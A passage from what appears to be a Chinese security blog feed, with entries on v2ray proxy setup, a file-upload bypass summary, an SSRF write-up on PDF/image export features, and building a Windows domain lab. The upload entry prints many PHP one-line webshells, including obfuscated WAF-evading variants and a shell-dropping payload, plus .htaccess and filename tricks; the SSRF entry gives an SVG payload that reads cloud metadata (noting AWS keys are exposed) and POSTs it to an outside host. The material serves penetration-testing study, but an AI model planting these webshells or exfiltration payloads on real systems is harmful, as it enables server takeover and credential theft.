<p>输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v2ray -h</span><br></pre></td></tr></table></figure>

<p>可以查看 v2ray 的命令</p>
<h2 id="0x03-开始连接"><a href="#0x03-开始连接" class="headerlink" title="0x03 开始连接"></a>0x03 开始连接</h2><p>vps上 输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v2ray url</span><br></pre></td></tr></table></figure>

<p>生成链接，粘贴到 windows 客户端的 v2rayN 客户端上即可。</p>
<p>网速时好时坏。</p>
<p>菜单栏右键 v2ray 的小图标，系统代理选择自动配置系统代理，路由选择绕过大陆。</p>
]]></content>
      <categories>
        <category>隐匿技术</category>
      </categories>
      <tags>
        <tag>科学上网</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞总结</title>
    <url>/posts/b96d5de5.html</url>
    <content><![CDATA[<h1 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h1><h2 id="1-修改文件名后缀"><a href="#1-修改文件名后缀" class="headerlink" title="1. 修改文件名后缀"></a>1. 修改文件名后缀</h2><ul>
<li>%00截断</li>
</ul>
<p>post提交的话，需要将%00进行url编码</p>
<ul>
<li><strong>大小写、双写绕过文件上传</strong></li>
<li><strong>点、空格绕过文件上传</strong></li>
</ul>
<p>在文件后缀上添加空格重新命名，会自动删除所谓的空格，点同理会自动删除的，因为可能尝试欺骗服务器验证。系统默认是不支持加空格、加点的，比如“.php空格”会自动解析为“.php”，“.php.”会自动解析为“.php”。比如使用BurpSuite抓包进行操作，如下图所示，将上传的“.php”文件后增加一个空格，再点击Forward进行上传。</p>
<ul>
<li><strong>PHP345文件绕过上传</strong></li>
</ul>
<p>PHP3代表PHP版本3，这里用于文件绕过检测。一般的软件都是向下兼容，PHP3代码，PHP5同样兼容能够执行。如下图所示，fox.php5文件同样能够正常上传。</p>
<ul>
<li><strong>Windows ::$DATA绕过</strong></li>
</ul>
<p>Windows ::$DATA绕过只能用于Windows，Windows下NTFS文件系统有一个特性，即NTFS文件系统在存储数据流的一个属性DATA时，是请求a.php本身的数据。如果a.php还包含了其他的数据流，比如a.php:lake2.php，请求a.php:lake2.php::$DATA，则是请求a.php中的流数据lake2.php的流数据内容。简单来说，就是在数据后面加上::$DATA实现绕过，fox.php::$DATA返回fox.php数据。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/文件上传漏洞总结/image-20210725213458470.png" alt="image-20210725213458470" style="zoom:50%;" />

<ul>
<li><strong>Apache解析漏洞上传</strong></li>
</ul>
<p>Apache是从右到左判断解析，如果为不可识别解析，就再往左判断。比如1.php.xxx对Apache来说xxx是不可解析的，所以就会解析成1.php，这就是该漏洞的实现原理。</p>
<h2 id="2-图片一句话木马"><a href="#2-图片一句话木马" class="headerlink" title="2. 图片一句话木马"></a>2. 图片一句话木马</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy mm.jpg/b+ma01.php/a mm-ma01.jpg</span><br></pre></td></tr></table></figure>

<p>有时候不需要这样，只要在加上gif头即可，一般情况下可以绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php assert($_POST[whuctf]); ?&gt;</span><br></pre></td></tr></table></figure>

<p>这是因为部分网站是有文件格式解析的，即网站会判断上传的脚本是否可以被执行，某些文件格式是无法被解析的，即上传的jpg\gif格式文件无法被php格式解析。这也是为什么有的图片一句话木马不能访问，其实和网站环境相关，也涉及到解析漏洞，需要让所上传的文件按php格式解析才能运行。</p>
<h2 id="3-过狗一句话"><a href="#3-过狗一句话" class="headerlink" title="3. 过狗一句话"></a>3. 过狗一句话</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//通过变量赋值</span><br><span class="line">&lt;?php $a=&#x27;b&#x27;; $$a=&#x27;assert&#x27;; $b($_POST[shell]); ?&gt;</span><br><span class="line">&lt;?php $a = &quot;eval&quot;; $a(@$_POST[&#x27;shell&#x27;]); ?&gt;</span><br><span class="line"></span><br><span class="line">//通过str_replace函数替换</span><br><span class="line">&lt;?php $a=str_replace(&quot;Waldo&quot;, &quot;&quot;, &quot;eWaldoval&quot;); $a(@$_POST[&#x27;shell&#x27;]); ?&gt;</span><br><span class="line"></span><br><span class="line">//通过base64_decode函数编码</span><br><span class="line">&lt;?php $a=base64_decode(&quot;ZXZhbA==&quot;); $a($_POST[&#x27;shell&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">//通过字符串拼接</span><br><span class="line">&lt;?php $a=&quot;e&quot;.&quot;v&quot;; $b=&quot;a&quot;.&quot;l&quot;; $c=$a.$b; $c($_POST[&#x27;shell&#x27;]); ?&gt;</span><br><span class="line"></span><br><span class="line">//利用parse_str函数</span><br><span class="line">&lt;?php $str=&quot;a=eval&quot;; parse_str($str); $a($_POST[&#x27;shell&#x27;]); ?&gt;</span><br><span class="line"></span><br><span class="line">//使用脚本</span><br><span class="line">&lt;script language=&quot;PHP&quot;&gt; @eval($_POST[&#x27;shell&#x27;]); &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">//创建shell.php文件</span><br><span class="line">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php assert($_POST[whuctf]);?&gt;&#x27;); ?&gt;</span><br><span class="line"></span><br><span class="line">//使用一句话木马时可以在函数前加”@”符 让php语句不显示错误信息从而增加隐蔽性</span><br></pre></td></tr></table></figure>

<h2 id="4-常见MIME"><a href="#4-常见MIME" class="headerlink" title="4. 常见MIME"></a>4. 常见MIME</h2><ul>
<li>{“.3gp”, “video&#x2F;3gpp” }</li>
<li>{“.asp”, “application&#x2F;x-asap” }</li>
<li>{“.avi”, “video&#x2F;x-msvideo” }</li>
<li>{“.bmp”, “image&#x2F;bmp” }</li>
<li>{“.cpp”, “text&#x2F;plain” }</li>
<li>{“.jpg”, “image&#x2F;jpeg” }</li>
<li>{“.mp4”, “video&#x2F;mp4” }</li>
</ul>
<h2 id="5-htaccess文件绕过上传"><a href="#5-htaccess文件绕过上传" class="headerlink" title="5. htaccess文件绕过上传"></a>5. <strong>htaccess文件绕过上传</strong></h2><p>.htaccess文件或者“分布式配置文件”提供了针对每个目录改变配置的方法，即在一个特定的目录中放置一个包含指令的文件，其中的指令作用于此目录及其所有子目录。简单来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。它的功能有：网页301重定向、自定义404错误页面、<strong>改变文件扩展名</strong>、允许&#x2F;阻止特定的用户或目录的访问、禁止目录列表、配置默认文档等。这里我们需要用到的是改变文件扩展名，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;eastmount&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>接着它会把fox名字的文件全都以php来运行，需要特殊文件进行创建，如Notepad++。首先上传一个“.htaccess”文件，再上传一个“fox.jpg”文件，它会将这张图片以php来解析。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/文件上传漏洞总结/image-20210725213249528.png" alt="image-20210725213249528" style="zoom:50%;" />

<h2 id="6-IIS6-0-解析漏洞"><a href="#6-IIS6-0-解析漏洞" class="headerlink" title="6. IIS6.0 解析漏洞"></a>6. <strong>IIS6.0 解析漏洞</strong></h2><ul>
<li>目录解析<br>以“*.asp”命名的文件夹里的文件都将会被当成ASP文件执行，比如“1.asp&#x2F;1.jpg”，这里1.jpg会被当做asp文件执行。</li>
<li>文件解析<br>“*.asp;.jpg”像这种畸形文件名在 “;” 后面的直接被忽略，也就是说当成 “*.asp”文件执行。比如“1.asp;1.jpg”命名的文件，同样是以asp脚本进行执行。</li>
</ul>
<p>利用IIS6.0解析漏洞，我们可以在网站下建立名字为“*.asp” 、“*.asa”的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析。例如创建目录“vidun.asp”，则“&#x2F;vidun.asp&#x2F;1.jpg”将被当作asp文件来执行。如下图所示，尝试在左边“upfile&#x2F;”文件路径名后面增加文件名称“1.asp;”，然后点击请求发送。右边会显示文件成功上传，其路径详见图中。</p>
<h2 id="7-编辑器漏洞"><a href="#7-编辑器漏洞" class="headerlink" title="7. 编辑器漏洞"></a>7. <strong>编辑器漏洞</strong></h2><p>编辑器属于第三方软件，它的作用是方便网站管理员上传或编辑网站上的内容，类似我们电脑上的Word文档。常用编辑器包括FCKeditor、EWEbeditor、CKFinder、UEDITOR等。</p>
<p><strong>FCKeditor编辑器漏洞利用</strong><br>在高版本fck中，直接上传或抓包修改文件名“a.asp;.jpg”，都会将前面的点变成下划线，也就是变成“a_asp;.jpg”，这样我们的文件名解析就无效果了。绕过方法是突破建立文件夹，其实质是利用我们IIS6.0的目录解析。</p>
<p>假设路径为“&#x2F;fckeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;test.html”，文件名中包含“fck”，可以直接判定为FCK编辑器。在FCKeditor中选中“a.asp;.png”并成功上传，如下图所示。</p>
<p>打开服务器，可以看到成功上传的图片文件。它名字被修改为“a_asp;.png”，这就是FCK高版本的过滤，它将“.”修改为“_”。</p>
<p><strong>eWebEditor编辑器漏洞</strong><br>eWeb编辑器需要登录后台，其默认数据库地址是：ewebeditor&#x2F;db&#x2F;ewebeditor.mdb，利用eweb遍历漏洞遍历文件目录、查看整个网站结构及敏感信息，比如：ewebeditor&#x2F;admin_uploadfile.asp?id&#x3D;14&amp;dir&#x3D;.&#x2F;。</p>
<h2 id="8-IIS高版本上传–畸形解析漏洞"><a href="#8-IIS高版本上传–畸形解析漏洞" class="headerlink" title="8. IIS高版本上传–畸形解析漏洞"></a>8. <strong>IIS高版本上传–畸形解析漏洞</strong></h2><ul>
<li>畸形解析漏洞影响版本<br>IIS7、IIS7.5、Nginx&lt;0.8.03</li>
<li>漏洞产生条件<br>开启Fast-CGI或php配置文件中cgi.fix_pathinfo。</li>
<li>漏洞产生原因<br>其漏洞不是IIS本身的问题，而是PHP配置不当造成的问题，根本原因是开启了cgi.fix_pathinfo选项。由于该漏洞是php配置造成，并且默认开启该功能，所以它影响了IIS7、IIS7.5、IIS8.5等多个版本，凡是IIS+PHP都有可能会有这个漏洞。</li>
<li>漏洞利用方法<br>当我们上传一张名为“1.jpg”的图片文件，并且这张图片文件里包含以下代码。那么它会生成一个叫shell.php的脚本文件，并写入我们的一句话，密码为cmd。而一句话的位置是：上传的图片文件名字“&#x2F;shell.php”。如果图片没有被改名，那么现在我们的一句话文件在“1.jpg&#x2F;shell.php”中。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>

<p>访问“&#x2F;1.jpg&#x2F;shell.php”显示的内容为空。</p>
<p>但是此时会在服务器生成一个名为“shell.php”的文件</p>
<p>并且“shell.php”包含了我们的一句话木马，这样通过Caidao即可访问该页面，并获取服务器的文件目录。</p>
<h2 id="9-aspx漏洞"><a href="#9-aspx漏洞" class="headerlink" title="9.  aspx漏洞"></a>9.  <strong>aspx漏洞</strong></h2><p>aspx它有一个“web.config”的配置文件，它规定我们上传文件的后缀。</p>
<p>我们可以自定一个后缀名来解析aspx文件。</p>
<p>换句话说，当我们遇到可以上传配置文件的时候，则上传我们修改好的配置文件，然后自定义一个后缀名如“.ad”，从而绕过WAF或检测，上传成功之后它会解析成aspx并执行。如下图所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210725214101370.png" alt="image-20210725214101370"></p>
<h2 id="10-双写filename绕过waf"><a href="#10-双写filename绕过waf" class="headerlink" title="10. 双写filename绕过waf"></a>10. 双写filename绕过waf</h2><p>重写filename，比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=&#x27;abc.jpg&#x27; </span><br><span class="line">重写为</span><br><span class="line">filename=&#x27;abc.jpg&#x27; filename=&#x27;abc.php&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="11-目录穿越"><a href="#11-目录穿越" class="headerlink" title="11. 目录穿越"></a>11. 目录穿越</h2><p>比如&#x2F;upload下禁止访问php文件，穿越目录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=&#x27;../../abc.php&#x27;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>漏洞总结</category>
      </categories>
      <tags>
        <tag>基础漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>文件导出功能的SSRF</title>
    <url>/posts/1870b258.html</url>
    <content><![CDATA[<blockquote>
<p>编者注：新姿势。</p>
</blockquote>
<p>转载于：<a href="https://forum.butian.net/share/1497">https://forum.butian.net/share/1497</a></p>
<p>本文讲述一下ssrf加metadata的利用方式，其他常规利用方式，好多师傅已经写过了这里就不再赘述。</p>
<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>文章开始前我们先讲述一下metadata service，也就是云服务器的元数据，每个云服务器厂商都有元数据，只是获取的接口地址不同，获取到的内容也不一样，有些元数据中是可以获取到登录凭证，可以直接接管服务器。由于元数据只能在云服务器上请求特定地址才能获取到，所以也常常用来作为ssrf利用方式的一种。</p>
<h1 id="0x01-metadata-service"><a href="#0x01-metadata-service" class="headerlink" title="0x01 metadata service"></a>0x01 metadata service</h1><h2 id="阿里云"><a href="#阿里云" class="headerlink" title="阿里云"></a>阿里云</h2><p>URL：<a href="http://100.100.100.200/">http://100.100.100.200</a></p>
<p>基本实例元数据项，就不做展示了，感兴趣的可以查看下官方文档<a href="https://help.aliyun.com/document/_detail/214777.htm?spm=a2c4g.11186623.0.0.777a4a07R5OHxw#concept-2078137">https://help.aliyun.com/document\_detail/214777.htm?spm=a2c4g.11186623.0.0.777a4a07R5OHxw#concept-2078137</a></p>
<p>动态实例元数据项</p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>数据项</strong></td>
<td align="left"><strong>说明</strong></td>
<td align="left"><strong>示例</strong></td>
</tr>
<tr>
<td align="left">&#x2F;dynamic&#x2F;instance-identity&#x2F;document</td>
<td align="left">实例标识文档，用于提供实例的身份信息，包括实例ID、IP地址等。</td>
<td align="left">{“zone-id”:”cn-hangzhou-i”,”serial-number”:”4acd2b47-b328-4762-852f-99****”,”instance-id”:”i-bp13znx0m0me8cq****”,”region-id”:”cn-hangzhou”,”private-ipv4”:”192.168.XX.XX”,”owner-account-id”:”1609****”,”mac”:”00:16:3e:0f:XX:XX”,”image-id”:”aliyun_3_x64_20G_alibase_20210425.vhd”,”instance-type”:”ecs.g6e.large”}</td>
</tr>
<tr>
<td align="left">&#x2F;dynamic&#x2F;instance-identity&#x2F;pkcs7</td>
<td align="left">实例标识签名，供其他方验证实例标识文档的真实性和内容。</td>
<td align="left">MIIDJwYJKoZIhvcNAQcCoIIDGDCCAxQCAQExCzAJBgUrDgMCGgUAMIIBYQYJKoZIhvcNAQcBoIIBUgSCAU57InpvbmUtaWQiOiJjbi1oYW5nemhvdS1oIiwic2VyaWFsLW****</td>
</tr>
</tbody></table>
<h2 id="腾讯云"><a href="#腾讯云" class="headerlink" title="腾讯云"></a>腾讯云</h2><p>URL：<a href="http://metadata.tencentyun.com/latest/meta-data/">http://metadata.tencentyun.com/latest/meta-data/</a></p>
<p>能够获取的信息比较少，可以查看下官方文档<a href="https://cloud.tencent.com/document/product/213/4934">https://cloud.tencent.com/document/product/213/4934</a></p>
<h2 id="AWS"><a href="#AWS" class="headerlink" title="AWS"></a>AWS</h2><p>URL：<a href="http://169.254.169.254/latest/meta-data/">http://169.254.169.254/latest/meta-data/</a></p>
<p>访问<a href="http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm/">http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm/</a></p>
<p>可以直接获取AccessKeyId和SecretAccessKey</p>
<p>官方文档<a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html">https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html</a></p>
<h1 id="0x02-导出功能SSRF测试"><a href="#0x02-导出功能SSRF测试" class="headerlink" title="0x02 导出功能SSRF测试"></a>0x02 导出功能SSRF测试</h1><p>1、有些网站存在功能，能够将一些将数据分析的表格导出为pdf或者图片，如下POST数据包，html文件就是我们要导出的内容，而这里存在ssrf漏洞</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%87%BA%E5%8A%9F%E8%83%BD%E7%9A%84SSRF/attach-f0271dc9c115d77f626a5558295ec87a69d690ad.png" alt="img"></p>
<p>2、我们将html内容修改为</p>
<p><svg>&lt;iframe src&#x3D;”<a href="http://123312.h41t0y.dnslog.cn"/">http://123312.h41t0y.dnslog.cn"</a> width&#x3D;” “ height&#x3D;” “&#x2F;&gt;</svg></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%87%BA%E5%8A%9F%E8%83%BD%E7%9A%84SSRF/attach-74975a836a1015a3a6a31142af0faa5270abdb90.png" alt="img"></p>
<p>可以看到成功触发了dnslog请求，说明此处是存在SSRF漏洞的。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%87%BA%E5%8A%9F%E8%83%BD%E7%9A%84SSRF/attach-0eca7beff0294aa789e9251c06a52b68070c3c1f.png" alt="img"></p>
<h1 id="0x03-SVG-SSRF"><a href="#0x03-SVG-SSRF" class="headerlink" title="0x03 SVG SSRF"></a>0x03 SVG SSRF</h1><p>由于 SVG 的功能十分丰富，所以能够处理SVG 的服务器就很有可能遭受到 SSRF、XSS、RCE 等的攻击，特别是在没有禁用一些特殊字符的情况下。</p>
<p>GitHub上有个大佬整理了丰富的svg攻击payload</p>
<p><a href="https://github.com/allanlw/svg-cheatsheet">https://github.com/allanlw/svg-cheatsheet</a></p>
<p>我们可以利用如下payload去获取metadata service中的数据信息。</p>
<p>首先加载一个可以远程获取到的图片，加载成功后，会触发onload事件 ；</p>
<p>使用 Fetch API接口，将元数据信息在存储到“params”参数中；</p>
<p>服务器向URL地址发起携带params的POST请求，这样我们就可以在历史数据包中找到我们想要的元数据信息了。</p>
<p>同理此方法也可以获取其他想要的数据信息。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;svg width=<span class="string">&quot;100%&quot;</span> height=<span class="string">&quot;100%&quot;</span> viewBox=<span class="string">&quot;0 0 100 100&quot;</span> </span><br><span class="line">xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> xmlns:xlink=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span><br><span class="line">&lt;image xlink:href=<span class="string">&quot;https://www.baidu.com/img/flexible/logo/pc/result@2.png&quot;</span> height=<span class="string">&quot;20&quot;</span> width=<span class="string">&quot;20&quot;</span> onload=<span class="string">&quot;fetch(&#x27;http://metadata.tencentyun.com/latest/meta-data/&#x27;).then(function (response) &#123;</span></span><br><span class="line"><span class="string">response.text().then(function(text) &#123;</span></span><br><span class="line"><span class="string">var params = text;</span></span><br><span class="line"><span class="string">var http = new XMLHttpRequest();</span></span><br><span class="line"><span class="string">var url = &#x27;https://xxxxxxxxxxxxxxxx/&#x27;;</span></span><br><span class="line"><span class="string">http.open(&#x27;POST&#x27;, url, true);</span></span><br><span class="line"><span class="string">http.send(params);</span></span><br><span class="line"><span class="string">&#125;)&#125;);&quot;</span> /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%87%BA%E5%8A%9F%E8%83%BD%E7%9A%84SSRF/attach-89ebded150ffbfe0c308c745861c65fa26319a1f.png" alt="image.png"></p>
<h1 id="0x04-meta-refresh"><a href="#0x04-meta-refresh" class="headerlink" title="0x04 meta refresh"></a>0x04 meta refresh</h1><h2 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h2><p>当一些特殊标签比如<svg>,<Iframe>等被禁用后，我们可以使用<meta>0秒刷新请求元数据，以下为具体payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;refresh&quot;</span> content=<span class="string">&quot;0;url=http://metadata.tencentyun.com/latest/meta-data&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>

<p>那么目标服务器的metadata信息就会打印在输出的PDF文件上</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%87%BA%E5%8A%9F%E8%83%BD%E7%9A%84SSRF/attach-da1d606f9eff5867571d31bf12bffc634e45a908.png" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%87%BA%E5%8A%9F%E8%83%BD%E7%9A%84SSRF/attach-f0aacaeacf315464c0cb5eb51b94a6ab6293238e.png" alt="img"></p>
<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>应用程序导出数据为PDF或图片，会产生ssrf的原因，我认为是后端在处理数据的时候，没有进行过滤，导致了恶意代码的运行，那么我们在任意文件上传的漏洞，是不是可以直接上传svg文件，达到一些命令执行的效果呢</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/allanlw/svg-cheatsheet">https://github.com/allanlw/svg-cheatsheet</a></p>
<p><a href="https://infosecwriteups.com/svg-ssrfs-and-saga-of-bypasses-777e035a17a7">https://infosecwriteups.com/svg-ssrfs-and-saga-of-bypasses-777e035a17a7</a></p>
<p><a href="https://twitter.com/kunalp94/status/1502527605836173312">https://twitter.com/kunalp94/status/1502527605836173312</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>基础漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>内网环境构建</title>
    <url>/posts/1f03f9ce.html</url>
    <content><![CDATA[<h2 id="搭建域环境"><a href="#搭建域环境" class="headerlink" title="搭建域环境"></a>搭建域环境</h2><h3 id="0-环境准备"><a href="#0-环境准备" class="headerlink" title="0. 环境准备"></a>0. 环境准备</h3><p>msdn下载靶机：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://msdn.itellyou.cn/</span><br></pre></td></tr></table></figure>



<h3 id="1-环境拓扑图"><a href="#1-环境拓扑图" class="headerlink" title="1. 环境拓扑图"></a>1. 环境拓扑图</h3><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/构建内网环境/image-20210926092430606.png" alt="image-20210926092430606" style="zoom:50%;" />

<h3 id="2-域信息"><a href="#2-域信息" class="headerlink" title="2. 域信息"></a>2. 域信息</h3><table>
<thead>
<tr>
<th align="center"></th>
<th align="center">操作系统</th>
<th align="center">角色</th>
<th align="center">连接模式</th>
<th align="center">ip</th>
</tr>
</thead>
<tbody><tr>
<td align="center">vm1</td>
<td align="center">win7</td>
<td align="center">边界服务器</td>
<td align="center">nat、host-only</td>
<td align="center">nat:192.168.10.130&#x2F;24    host-only:192.168.52.143  网关：192.168.52.2  dns:192.168.52.138</td>
</tr>
<tr>
<td align="center">vm1</td>
<td align="center">win server 2003 R2</td>
<td align="center">域成员</td>
<td align="center">host-only</td>
<td align="center">192.168.52.141</td>
</tr>
<tr>
<td align="center">vm3</td>
<td align="center">win server 2008 R2</td>
<td align="center">域控</td>
<td align="center">host-only</td>
<td align="center">192.168.52.138</td>
</tr>
</tbody></table>
<h3 id="3-win-server-2008-R2"><a href="#3-win-server-2008-R2" class="headerlink" title="3. win server 2008 R2"></a>3. win server 2008 R2</h3><h4 id="（1）设置服务器"><a href="#（1）设置服务器" class="headerlink" title="（1）设置服务器"></a>（1）设置服务器</h4><p>打开安装好的 win2K8 ，配置 IP 地址、子网掩码和 dns 服务器（dns 指向本机 IP），如下图：</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/构建内网环境/image-20210926203918694.png" alt="image-20210926203918694" style="zoom:50%;" />

<h4 id="（2）更改计算机名"><a href="#（2）更改计算机名" class="headerlink" title="（2）更改计算机名"></a>（2）更改计算机名</h4><p>例如将计算机命名为 owa ，在将本机升级为域控制器后，计算机全名会自动变成 “owa.god.org” ，god.org 是该域的名称。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E6%9E%84%E5%BB%BA%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83/image-20210926204920762.png" alt="image-20210926204920762"></p>
<h4 id="（3）安装域控制器和-DNS-服务"><a href="#（3）安装域控制器和-DNS-服务" class="headerlink" title="（3）安装域控制器和 DNS 服务"></a>（3）安装域控制器和 DNS 服务</h4><p>打开 <code>服务器管理器</code> 窗口，右键 <code>角色</code>，单击 <code>添加角色</code>，选择 <code>DNS 服务器</code>、<code>Active Directory 域服务</code>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E6%9E%84%E5%BB%BA%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83/image-20210926211546090.png" alt="image-20210926211546090"></p>
<p>一路按确认即可。</p>
<h4 id="（4）升级服务器"><a href="#（4）升级服务器" class="headerlink" title="（4）升级服务器"></a>（4）升级服务器</h4><p>安装 <code>Active Directory 域服务</code> 后，需要将此服务器提升为域控制器。右键<code>Active Directory 域服务</code> ，选择 <code>添加角色服务</code>，选择 <code>AD 域控制器</code> 。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E6%9E%84%E5%BB%BA%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83/image-20210926212731261.png" alt="image-20210926212731261"></p>
<p>在<code>部署配置</code>中，选择添加 <code>新林</code>，然后输入根域名 <code>god.org</code> 。</p>
<p>在 <code>域控制器选项</code> 部分，将林功能级别、域功能级别都设置为你现在所使用的服务器名称。创建域林时，在默认情况下应选择 DNS 服务器，林中的第一个域控制器必须是全局目录服务器且不能是只读域控制器（RODC）。然后，设置目录服务还原模式的密码（在开机进入安全模式修复活动目录数据库时将使用此密码）。</p>
<p>在 <code>DNS选项</code> 部分会出现关于 DNS 的警告，无需理会。在 <code>NetBIOS 域名</code> （不支持 DNS 域名的旧版操作系统，例如 win98、NT，需要通过 NetBIOS 域名进行通信）部分保持默认即可。</p>
<p>在 <code>路径</code> 部分，指定数据库、日志、SYSVOL 文件夹的位置，其他选项保持默认设置。</p>
<p>一路默认，重启服务器完成安装。</p>
<h4 id="（5）创建-Active-Directory-用户"><a href="#（5）创建-Active-Directory-用户" class="headerlink" title="（5）创建 Active Directory 用户"></a>（5）创建 Active Directory 用户</h4><p>右键 <code>User</code> ，添加用户。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/构建内网环境/image-20210926215037789.png" alt="image-20210926215037789" style="zoom:50%;" />

<h3 id="4-Win7"><a href="#4-Win7" class="headerlink" title="4. Win7"></a>4. Win7</h3><p>将 Win7 添加到 <code>god.org</code> 域环境</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E6%9E%84%E5%BB%BA%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83/image-20210926215542071.png" alt="image-20210926215542071"></p>
<p>单击确定后，会要求输入拥有权限的域账户名和密码，操作完成后，重启动电脑。</p>
